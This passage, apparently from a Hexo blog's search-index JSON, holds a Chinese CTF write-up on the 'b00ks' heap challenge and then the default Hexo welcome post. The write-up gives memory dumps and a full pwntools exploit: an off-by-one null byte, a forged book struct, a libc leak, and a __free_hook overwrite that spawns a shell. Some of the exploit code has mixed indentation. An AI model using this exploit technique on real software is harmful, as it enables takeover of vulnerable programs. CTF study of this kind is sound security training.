位置\n\n~~~assembly\n        0x55865b7c9040:    0x4141414141414141    0x4141414141414141\n        0x55865b7c9050:    0x4141414141414141    0x4141414141414141 --> author\nb00ks<--0x55865b7c9060:    0x000055865cc0d160(first book)    0x0000000000000000\n~~~\n\nnull byte overflow\n\n~~~assembly\n0x55865b7c9040:    0x4141414141414141    0x4141414141414141\n0x55865b7c9050:    0x4141414141414141    0x4141414141414141\n0x55865b7c9060:    0x000055865cc0d100(0x60-->0x00)    0x000055865cc0d190\n~~~\n\n**1. 创建第一个firest book**\n\n~~~assembly\n0x55f276c74160:    0x0000000000000001                 0x000055f276c74020--> Name\n0x55f276c74170:    0x000055f276c740c0(description)    0x000000000000008c(140)\n~~~\n\n当`0x55f276c74160 --> 0x55f276c74100`时, `0x55f276c74100`正好落在`first b00k`的`description`中, 属于可控范围, 为我们伪造`b00k`打下了基础.\n\n**2. leak book1 addr**\n\nmy_read 读入的结束符 '\\x00' 会被写如 book1 时覆盖\n\n所以 print author name 时 会泄露 book1 在 buf 的地址\n\n**3. 申请 book2**\n\nbook2的description的大小越大越好(如0x21000)，这样会通过mmap()函数去分配堆空间，而该堆地址与libc的基址相关，这样通过泄露该堆地址可以计算出libc的基址。\n\n**4. 伪造book**\n\n~~~assembly\n0x55f276c740c0:    0x4141414141414141    0x4141414141414141\n0x55f276c740d0:    0x4141414141414141    0x4141414141414141\n0x55f276c740e0:    0x4141414141414141    0x4141414141414141\n0x55f276c740f0:    0x4141414141414141    0x4141414141414141\n0x55f276c74100:    0x0000000000000001    0x000055f276c74198----\n0x55f276c74110:    0x000055f276c74198    0x000000000000ffff   |\n......                                                   |\n0x55f276c74160:    0x0000000000000001    0x000055f276c74020   |\n0x55f276c74170:    0x000055f276c740c0    0x000000000000008c   |\n0x55f276c74180:    0x0000000000000000    0x0000000000000031   |\n0x55f276c74190:    0x0000000000000002    0x00007f282b8e7010 <-|\n0x55f276c741a0:    0x00007f282b8c5010    0x0000000000021000\n0x55f276c741b0:    0x0000000000000000    0x0000000000020e51\n~~~\n\n可以看到`0x55f276c74100`已经是`fake b00k1`\n\n**5. 空字节覆盖 leak book2 name pointer&libcbase**\n\n~~~assembly\n0x55f275d55040:    0x4141414141414141    0x4141414141414141\n0x55f275d55050:    0x4141414141414141    0x4141414141414141\n0x55f275d55060:    0x000055f276c74100    0x000055f276c74190\n~~~\n\n泄露的是`second b00k`的`name pointer`和`description pointer`.\n这个指针和libc base address是有直接联系的.\n\n~~~assembly\n0x000055f276c73000 0x000055f276c95000 rw-p    [heap]\n0x00007f282b33e000 0x00007f282b4fe000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f282b4fe000 0x00007f282b6fe000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so\n~~~\n\n  `offset = 0x7f282b8e7010 - 0x00007f282b33e000 = 0x5a9010`\n  **结论:** 通过伪造的`b00k`, 我们泄露了 `libc base address`.\n\n**6. 获取相关指针\n\n主要是两个\n\n~~~assembly\nmalloc_hook = libc.symbols['__free_hook'] + libcbase\nexecve_addr = libcbase + 0x4526a\n~~~\n\n **结论:**  通过`libc base address`, 退出了`__free_hook`和`execve_addr`在程序中的实际位置.\n\n**7. 修改 get shell**\n\n通过先后修改`book1_description`和`book2_description`，可以实现任意地址写任意内容的功能。由于该程序启用了`FULL RELRO`保护措施，无法对`GOT`进行改写，但是可以改写`__free_hook`或`__malloc_hook`。\n\n通过`first b00k`修改`second b00k`的`description`指针为`__free_hook`, 在修改second b00k的description内容为`execve(\"/bin/sh\", null, environ)`, 最后执行`free`\n\n~~~assembly\n0x55f276c74190:    0x0000000000000002    0x00007f282b7047a8 --\n0x55f276c741a0:    0x00007f282b7047a8    0x0000000000021000  |\n......                                                  |\n0x7f282b7047a8 <__free_hook>:  0x00007f306ff4726a    0x0000000000000000\n~~~\n\n**结论:** 由于`__free_hook`里面的内容不为`NULL`, 遂执行内容指向的指令, 即`execve(\"/bin/sh\", null, environ)`\n\n#### 相关问题解答\n\n**为什么第二个 b00k申请的空间那么大?**\n\n> ​    If we allocate a chunk bigger than the wilderness chunk, it  mmap’s a new area for use. And this area is adjacent to the libc’s bss  segment\n> 简单的说, 申请小了不能够泄露出`libc base address`\n\n\n\n**exp**\n\n~~~python\nfrom pwn import *\n#context.log_level = 'debug'\nelf = ELF(\"./b00ks\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\np = process(\"./b00ks\")\n\ndef create_name(name):\n\tp.sendlineafter(\"Enter author name: \", name)\n\ndef create_book(size,name,des_size,des):\n\tp.sendlineafter(\"> \",\"1\")\n\tp.sendlineafter(\"\\nEnter book name size: \",str(size))\n\tp.sendlineafter(\"Enter book name (Max 32 chars): \",name)\n\tp.sendlineafter(\"\\nEnter book description size: \", str(des_size))\n\tp.sendlineafter(\"Enter book description: \", des)\n\ndef delete_book(id):\n\tp.sendlineafter(\"> \", \"2\")\n\tp.sendlineafter(\"Enter the book id you want to delete: \", str(id))\n\ndef edit_book(id,new_des):\n\tp.sendlineafter(\"> \",\"3\")\n\tp.sendlineafter(\"Enter the book id you want to edit: \", str(id))\n\tp.sendlineafter(\"Enter new book description: \", new_des)\n\ndef memleak2():\n\tp.sendlineafter(\"> \",\"4\")\n\tp.recvuntil(\"Name: \")\n\tmsg=p.recvline().strip(\"\\n\")\n    msg=u64(msg.ljust(8, \"\\x00\"))\n    log.success(\"Leaked address of second book name pointer : \" + hex(msg))\n    return msg\n\ndef change_name(name):\n\tp.sendlineafter(\"> \",\"5\")\n\tp.sendlineafter(\"Enter author name: \", name)\ndef memleak1():\n\tp.recvuntil(\"> \")\n\tp.sendline(\"4\")\n\tp.recvuntil(\"Author:\")\n\tmsg = p.recvuntil(\"\\n\",drop=True)[33:]\n\tlog.success(\"msg : \"+msg)\n\taddr = u64(msg.ljust(8, \"\\x00\"))\n\tlog.success(\"Leaked address of first book : \" + hex(addr))\n\treturn addr\ncreate_name(\"a\"*32)\ncreate_book(140,\"a\",140,\"a\")\n#leak book addr\nfirst_addr = memleak1()\nsecond_addr = first_addr + 0x38\nlog.success(\"second addr : \" + hex(second_addr))\n\n#create second book\ncreate_book(0x21000,\"a\",0x21000,\"a\")\n\n#fake first book\npayload = \"a\"*0x40 + p64(1) + p64(second_addr)*2 + p64(0xffff)\nedit_book(1,payload)\n\n#null byte off-by-one\nchange_name(\"a\"*32)\n\n#leak second book pointer\nsec_name_addr = memleak2()\n\nlibcbase = sec_name_addr - 0x5b0010\nlog.info(\"libcbase: %s\" % hex(libcbase))\nfree_hook = libc.symbols['__free_hook'] + libcbase\nlog.success(\"free_hook : \" + hex(free_hook))\nexecve_addr = libcbase + 0x45216\nlog.success(\"execve : \" + hex(execve_addr))\n#gdb.attach(p)\n# getshell\nsystem = libc.symbols['system'] + libcbase\nbinsh_addr = libc.search('/bin/sh').next() + libcbase\npayload = p64(binsh_addr) + p64(free_hook)\nedit_book(1, payload)\npayload = p64(system)\nedit_book(2, payload)\n'''\nedit_book(1,p64(free_hook)*2)\nedit_book(2,p64(execve_addr))\n'''\ndelete_book(2)\np.interactive()\n~~~\n","tags":["pwn","heap"],"categories":["CTF"]},{"title":"Hello World","url":"/2019/10/10/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n"}]